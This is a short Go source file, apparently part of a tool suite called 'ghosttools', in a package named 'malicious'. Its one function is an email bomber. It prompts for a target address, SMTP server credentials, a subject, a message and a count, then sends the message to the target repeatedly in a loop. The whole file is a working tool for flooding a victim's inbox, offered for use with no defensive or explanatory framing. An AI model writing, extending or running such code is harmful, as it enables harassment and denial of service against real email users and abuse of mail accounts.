package malicious

import (
    "fmt"
    "net/smtp"
    "strings"
    "time"

    "ghosttools/internal/ui"
)

func EmailBomber() {
    ui.Cyan("enter target email:")
    var target string
    fmt.Scanln(&target)
    target = strings.TrimSpace(target)

    ui.Cyan("enter smtp server (e.g. smtp.gmail.com:587):")
    var smtpAddr string
    fmt.Scanln(&smtpAddr)
    ui.Cyan("enter smtp user:")
    var user string
    fmt.Scanln(&user)
    ui.Cyan("enter smtp pass:")
    var pass string
    fmt.Scanln(&pass)
    ui.Cyan("subject:")
    var subject string
    fmt.Scanln(&subject)
    ui.Cyan("message:")
    var msg string
    fmt.Scanln(&msg)
    ui.Cyan("count:")
    var n int
    fmt.Scanln(&n)

    auth := smtp.PlainAuth("", user, pass, strings.Split(smtpAddr, ":")[0])
    for i := 0; i < n; i++ {
        body := "From: " + user + "\r\nTo: " + target + "\r\nSubject: " + subject + "\r\n\r\n" + msg
        err := smtp.SendMail(smtpAddr, auth, user, []string{target}, []byte(body))
        if err != nil {
            ui.Red(fmt.Sprintf("%d: %v", i, err))
        } else {
            fmt.Printf("  sent %d/%d\n", i+1, n)
        }
        time.Sleep(200 * time.Millisecond)
    }
}